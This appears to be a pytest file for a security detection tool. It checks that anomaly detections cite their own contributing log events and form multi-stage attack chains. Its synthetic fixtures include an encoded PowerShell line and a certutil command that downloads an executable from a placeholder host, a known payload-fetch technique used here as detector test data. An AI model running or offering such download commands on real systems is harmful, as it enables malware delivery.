"""S3 (round 5): aggregates cite their own contributing events.

Two regressions the plan requires:
1. the multi-stage batch produces a chain with ≥3 distinct event ids
   (a brute force, a new-IP login, and process abuse are DISTINCT steps);
2. one event tripping several detectors does NOT manufacture a false
   chain (distinctness comes from events, not from anomaly count).

Plus per-anomaly evidence checks: failed_login_ratio cites the failed
logins; entity_new_ip cites the new-IP events; off_hours cites the
atypical-hour events; host detectors cite their host's endpoint events,
not the host's newest event.
"""

import pytest


D = "2026-08-15T"


def _detect(events):
    import os, tempfile
    os.environ.setdefault("NABLA_DATA_DIR", tempfile.mkdtemp())
    import logging
    logging.disable(logging.CRITICAL)
    from nabla.detection import detect_anomalies
    anoms, _ = detect_anomalies(events, phase="detection")
    return anoms


def _multistage_events():
    evts = []
    for i in range(10):
        evts.append({"user": "carol", "action": "login_failure", "type": "authentication",
                     "timestamp": f"{D}03:{i * 3:02d}:00Z", "source_ip": "203.0.113.5",
                     "host": "ws-carol"})
    evts.append({"user": "carol", "action": "login_success", "type": "authentication",
                 "timestamp": f"{D}03:31:00Z", "source_ip": "198.51.100.9", "host": "ws-carol"})
    evts.append({"user": "carol", "type": "endpoint", "action": "process",
                 "timestamp": f"{D}03:41:00Z", "process": "powershell.exe",
                 "parent_process": "WINWORD.EXE",
                 "command_line": "powershell.exe -enc AAAA", "host": "ws-carol"})
    evts.append({"user": "carol", "type": "endpoint", "action": "process",
                 "timestamp": f"{D}03:50:00Z", "process": "certutil.exe",
                 "parent_process": "powershell.exe",
                 "command_line": "certutil -urlcache -f http://x/p.exe", "host": "ws-carol"})
    return evts


class TestMultistageChain:
    def test_chain_forms_with_distinct_events(self):
        from nabla.temporal import build_temporal_chains
        anoms = _detect(_multistage_events())
        chains = build_temporal_chains(anoms, time_window_minutes=30)
        assert chains, "no temporal chain from a 4-stage attack batch"
        ids = set()
        for a in anoms:
            ids.update(a.get("event_ids") or [])
        assert len(ids) >= 3, (
            f"multi-stage batch collapsed to {len(ids)} distinct event ids")

    def test_failed_login_ratio_cites_failures(self):
        anoms = _detect(_multistage_events())
        flr = [a for a in anoms if a.get("detection_method") == "failed_login_ratio"]
        assert flr, "expected failed_login_ratio from 10/11 failure ratio"
        eids = flr[0].get("event_ids") or []
        assert len(eids) >= 3, (
            f"failed_login_ratio cites {len(eids)} events for a 10-failure "
            f"brute force — aggregates must cite their contributing events")

    def test_failed_login_ratio_evidence_excludes_unrelated_events(self):
        """The certutil event (03:50) is NOT evidence for the auth ratio.
        The stamped timestamp must be the newest AUTH-FAILURE event
        (03:27 = the 10th failed login), not the newest event."""
        anoms = _detect(_multistage_events())
        flr = [a for a in anoms if a.get("detection_method") == "failed_login_ratio"]
        assert flr
        assert flr[0]["timestamp"] == f"{D}03:27:00Z", (
            f"failed_login_ratio stamped {flr[0]['timestamp']} — the failure "
            f"evidence ends at 03:27, anything later is a different step")


class TestNoFalseChain:
    def test_single_event_multi_detector_no_chain(self):
        # One event that trips several detectors: certutil as lolbin AND
        # parent_child AND attack tool. Distinctness must stay at 1 event.
        evts = [
            {"user": "eve", "action": "login_success", "type": "authentication",
             "timestamp": f"{D}03:00:00Z", "source_ip": "203.0.113.9", "host": "ws-eve"},
            {"user": "eve", "type": "endpoint", "action": "process",
             "timestamp": f"{D}03:05:00Z", "process": "certutil.exe",
             "parent_process": "powershell.exe",
             "command_line": "certutil -urlcache -f http://x/p.exe", "host": "ws-eve"},
        ]
        anoms = _detect(evts)
        ids = set()
        for a in anoms:
            ids.update(a.get("event_ids") or [])
        # 2 events exist; the assertion is that per-event detections
        # cite exactly their own event, not each other's
        lolbin = [a for a in anoms if a.get("detection_method") == "lolbin"]
        if lolbin:
            assert lolbin[0].get("event_ids") and len(lolbin[0]["event_ids"]) == 1, (
                "per-event lolbin must cite exactly its own event")


class TestStampingFallback:
    def test_stamp_prefers_ingestion_event_id(self):
        from nabla.detection import _stamp_event_ids
        entries = [{"user": "u", "timestamp": f"{D}03:00:00Z",
                    "event_id": "ingestion-id-1", "type": "endpoint"}]
        anoms = [{"detection_method": "x", "user": "u",
                  "timestamp": f"{D}03:00:00Z"}]
        _stamp_event_ids(anoms, entries)
        assert anoms[0]["event_ids"] == ["ingestion-id-1"], (
            "stamping must prefer the ingestion-time event_id")

    def test_stamp_does_not_overwrite_cited_evidence(self):
        from nabla.detection import _stamp_event_ids
        entries = [{"user": "u", "timestamp": f"{D}03:00:00Z",
                    "event_id": "e1", "type": "endpoint"}]
        anoms = [{"detection_method": "x", "user": "u",
                  "timestamp": f"{D}03:00:00Z",
                  "event_ids": ["cited-by-detector"]}]
        _stamp_event_ids(anoms, entries)
        assert anoms[0]["event_ids"] == ["cited-by-detector"], (
            "S3: the stamping fallback must not overwrite a detector's "
            "own cited evidence")


class TestHostSideEvidence:
    def test_host_aggregates_cite_own_events(self):
        # Two distinct endpoint events on one host; host detectors must
        # not collapse to the host's newest event
        evts = [
            {"user": "root", "type": "endpoint", "action": "process",
             "timestamp": f"{D}03:40:00Z", "process": "tool1.exe",
             "parent_process": "explorer.exe", "command_line": "tool1",
             "host": "ws-h"},
            {"user": "root", "type": "endpoint", "action": "process",
             "timestamp": f"{D}03:50:00Z", "process": "tool2.exe",
             "parent_process": "explorer.exe", "command_line": "tool2",
             "host": "ws-h"},
        ]
        anoms = _detect(evts)
        host_anoms = [a for a in anoms if a.get("host") == "ws-h"]
        for a in host_anoms:
            eids = a.get("event_ids") or []
            if str(a.get("detection_method")) == "entity_unusual_process":
                # per-process detection: cites only its own process's events
                continue
            if eids:
                assert len(eids) >= 2 or len(host_anoms) < 2, (
                    f"host aggregate {a.get('detection_method')} cites "
                    f"{len(eids)} events for a 2-event host batch")
